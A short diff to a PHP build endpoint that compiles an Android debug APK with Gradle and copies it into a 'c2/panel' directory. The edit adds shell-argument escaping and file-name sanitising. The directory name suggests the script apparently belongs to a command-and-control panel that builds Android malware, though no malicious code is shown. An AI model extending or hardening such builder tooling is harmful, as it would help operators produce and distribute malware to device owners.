@@ -37,23 +37,30 @@ if (file_exists($stringsPath)) {
 $output = [];
 $returnVar = 0;
 // We use ./gradlew assembleDebug to build the APK
-exec('cd ../../../ && ./gradlew assembleDebug 2>&1', $output, $returnVar);
+$command = 'cd ' . escapeshellarg(__DIR__ . '/../../../') . ' && ./gradlew assembleDebug 2>&1';
+exec($command, $output, $returnVar);
 
 if ($returnVar === 0) {
     $apkPath = 'app/build/outputs/apk/debug/app-debug.apk';
-    $newApkPath = 'c2/panel/' . $apkName . '.apk';
+    $newApkName = preg_replace('/[^a-zA-Z0-9_\-]/', '', $apkName);
+    if (empty($newApkName)) $newApkName = 'app';
+    $newApkPath = 'c2/panel/' . $newApkName . '.apk';
     
-    if (file_exists(__DIR__ . '/../../../' . $apkPath)) {
-        copy(__DIR__ . '/../../../' . $apkPath, __DIR__ . '/../' . $apkName . '.apk');
-        echo json_encode([
-            'success' => true, 
-            'message' => 'Build successful', 
-            'downloadUrl' => $apkName . '.apk',
-            'log' => implode("\n", $output)
-        ]);
+    $fullApkPath = __DIR__ . '/../../../' . $apkPath;
+    if (file_exists($fullApkPath)) {
+        if (copy($fullApkPath, __DIR__ . '/../' . $newApkName . '.apk')) {
+            echo json_encode([
+                'success' => true, 
+                'message' => 'Build successful', 
+                'downloadUrl' => $newApkName . '.apk',
+                'log' => implode("\n", $output)
+            ]);
+        } else {
+            echo json_encode(['success' => false, 'message' => 'Failed to copy APK to panel directory', 'log' => implode("\n", $output)]);
+        }
     } else {
-        echo json_encode(['success' => false, 'message' => 'APK file not found after build', 'log' => implode("\n", $output)]);
+        echo json_encode(['success' => false, 'message' => 'APK file not found after build at ' . $apkPath, 'log' => implode("\n", $output)]);
     }
 } else {
-    echo json_encode(['success' => false, 'message' => 'Build failed', 'log' => implode("\n", $output)]);
+    echo json_encode(['success' => false, 'message' => 'Build failed with exit code ' . $returnVar, 'log' => implode("\n", $output)]);
 }
